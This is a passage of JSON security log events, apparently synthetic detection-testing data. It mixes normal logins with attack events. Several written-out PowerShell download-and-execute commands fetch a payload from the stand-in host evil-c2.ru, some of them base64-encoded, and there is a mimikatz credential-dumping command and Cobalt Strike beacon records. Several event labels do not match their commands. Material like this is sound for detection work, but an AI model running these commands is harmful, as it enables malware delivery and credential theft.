    "process": "powershell.exe",
    "parent_process": "excel.exe",
    "cmdline": "powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAHIAdQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:35:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "kpatel",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "cmdline": "powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAHIAdQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION02"
  },
  {
    "timestamp": "2024-03-01T03:36:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION01",
    "EventCode": 4648,
    "category": "normal",
    "action": "logoff",
    "user": "rjohnson",
    "src_ip": "10.0.4.109",
    "dest_ip": "10.0.1.36",
    "severity": "low",
    "message": "Normal activity: rjohnson authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:44:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION02",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "emartinez",
    "process": "powershell.exe",
    "parent_process": "excel.exe",
    "cmdline": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION02"
  },
  {
    "timestamp": "2024-03-01T03:45:00.000+0000",
    "source": "edr",
    "host": "DC01",
    "EventCode": 4688,
    "category": "credential_dumping",
    "action": "process_created",
    "user": "jsmith",
    "process": "mimikatz.exe",
    "parent_process": "cmd.exe",
    "cmdline": "mimikatz.exe sekurlsa::logonpasswords",
    "file_hash": "44d88612fea8a8f36de82e1278abb02f",
    "severity": "critical",
    "ioc_hash": "44d88612fea8a8f36de82e1278abb02f",
    "attack_technique": "T1003.001 - LSASS Memory",
    "message": "Mimikatz execution detected - credential dumping attempt"
  },
  {
    "timestamp": "2024-03-01T03:48:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "swhite",
    "process": "powershell.exe",
    "parent_process": "excel.exe",
    "cmdline": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:49:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "bmorris",
    "process": "powershell.exe",
    "parent_process": "outlook.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:51:00.000+0000",
    "source": "proxy",
    "host": "WORKSTATION01",
    "EventCode": 4648,
    "category": "normal",
    "action": "network_access",
    "user": "bmorris",
    "src_ip": "10.0.5.190",
    "dest_ip": "10.0.0.190",
    "severity": "low",
    "message": "Normal activity: bmorris authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:52:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION01",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "lchen",
    "process": "powershell.exe",
    "parent_process": "outlook.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION01"
  },
  {
    "timestamp": "2024-03-01T03:53:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "svc_sql",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:54:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION04",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "jsmith",
    "process": "powershell.exe",
    "parent_process": "excel.exe",
    "cmdline": "powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAMgAuAHIAdQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION04"
  },
  {
    "timestamp": "2024-03-01T03:54:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION03",
    "EventCode": 4624,
    "category": "normal",
    "action": "network_access",
    "user": "swhite",
    "src_ip": "10.0.1.179",
    "dest_ip": "10.0.5.29",
    "severity": "low",
    "message": "Normal activity: swhite authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T03:59:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION03",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "rjohnson",
    "process": "powershell.exe",
    "parent_process": "outlook.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION03"
  },
  {
    "timestamp": "2024-03-01T04:00:00.000+0000",
    "source": "WinEventLog:Security",
    "host": "WORKSTATION01",
    "EventCode": 4104,
    "category": "lolbins",
    "action": "powershell_script_block",
    "user": "SYSTEM",
    "process": "powershell.exe",
    "parent_process": "winword.exe",
    "cmdline": "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://evil-c2.ru/payload')",
    "severity": "high",
    "attack_technique": "T1059.001 - PowerShell",
    "message": "Suspicious encoded PowerShell execution on WORKSTATION01"
  },
  {
    "timestamp": "2024-03-01T04:00:06.000+0000",
    "source": "dns",
    "host": "DNS01",
    "category": "c2_beaconing",
    "action": "dns_query",
    "user": "SYSTEM",
    "src_ip": "10.0.2.22",
    "query": "evil-c2.ru",
    "record_type": "A",
    "response_ip": "185.220.101.45",
    "severity": "critical",
    "ioc_domain": "evil-c2.ru",
    "ioc_ip": "185.220.101.45",
    "malware_family": "Cobalt Strike",
    "attack_technique": "T1071.004 - DNS C2",
    "message": "Regular DNS beacon to evil-c2.ru (Cobalt Strike C2)"
  },
  {
    "timestamp": "2024-03-01T04:02:00.000+0000",
    "source": "WinEventLog:System",
    "host": "WORKSTATION03",
    "EventCode": 4624,
    "category": "normal",
    "action": "network_access",
    "user": "lchen",
    "src_ip": "10.0.3.57",
    "dest_ip": "10.0.5.140",
    "severity": "low",
    "message": "Normal activity: lchen authenticated successfully"
  },
  {
    "timestamp": "2024-03-01T04:02:09.000+0000",
    "source": "dns",
    "host": "DNS01",
    "category": "c2_beaconing",
    "action": "dns_query",
    "user": "SYSTEM",
    "src_ip": "10.0.2.15",
    "query": "evil-c2.ru",
    "record_type": "A",
    "response_ip": "185.220.101.45",
    "severity": "critical",
    "ioc_domain": "evil-c2.ru",
    "ioc_ip": "185.220.101.45",
    "malware_family": "Cobalt Strike",
    "attack_technique": "T1071.004 - DNS C2",
    "message": "Regular DNS beacon to evil-c2.ru (Cobalt Strike C2)"
  },
  {
    "timestamp": "2024-03-01T04:04:09.000+0000",
    "source": "dns",
    "host": "DNS01",
    "category": "c2_beaconing",
    "action": "dns_query",
    "user": "SYSTEM",
    "src_ip": "10.0.2.22",
    "query": "evil-c2.ru",
    "record_type": "A",
    "response_ip": "185.220.101.45",
    "severity": "critical",
    "ioc_domain": "evil-c2.ru",
    "ioc_ip": "185.220.101.45",
    "malware_family": "Cobalt Strike",
    "attack_technique": "T1071.004 - DNS C2",
    "message": "Regular DNS beacon to evil-c2.ru (Cobalt Strike C2)"
  },
  {
    "timestamp": "2024-03-01T04:06:07.000+0000",
    "source": "dns",
    "host": "DNS01",
    "category": "c2_beaconing",
    "action": "dns_query",
    "user": "SYSTEM",
    "src_ip": "10.0.2.15",
    "query": "evil-c2.ru",
    "record_type": "A",
    "response_ip": "185.220.101.45",
    "severity": "critical",
    "ioc_domain": "evil-c2.ru",
    "ioc_ip": "185.220.101.45",
    "malware_family": "Cobalt Strike",
    "attack_technique": "T1071.004 - DNS C2",
    "message": "Regular DNS beacon to evil-c2.ru (Cobalt Strike C2)"
  },
  {
    "timestamp": "2024-03-01T04:08:00.000+0000",
    "source": "WinEventLog:System",
    "host": "WORKSTATION01",
    "EventCode": 4624,
    "category": "normal",
    "action": "network_access",
    "user": "rjohnson",
    "src_ip": "10.0.5.29",
    "dest_ip": "10.0.5.27",
    "severity": "low",
    "message": "Normal activity: rjohnson authenticated successfully"
  },
